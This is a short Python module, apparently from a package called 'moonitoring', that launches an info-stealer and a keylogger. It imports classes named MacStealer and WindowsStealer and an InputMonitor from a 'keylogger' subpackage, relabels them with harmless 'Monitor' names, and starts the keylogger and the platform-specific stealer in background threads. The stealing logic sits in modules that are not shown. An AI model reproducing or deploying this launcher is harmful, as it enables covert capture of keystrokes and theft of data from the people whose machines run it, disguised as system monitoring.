from moonitoring.macos.stealer import MacStealer as MacMonitor
import platform
from moonitoring.keylogger.input_monitor import InputMonitor
if platform.system().lower() == "windows":
    from moonitoring.windows.stealer import WindowsStealer as WindowsMonitor
import threading


def initialize_system_monitoring():    
    current_platform = platform.system().lower()
    
    input_monitor = threading.Thread(target=InputMonitor().start_monitoring)
    input_monitor.start()
    
    if current_platform == 'darwin':
        system_monitor = threading.Thread(target=MacMonitor().run)
        system_monitor.start()
    elif current_platform == 'windows':
        system_monitor = threading.Thread(target=WindowsMonitor().run)
        system_monitor.start()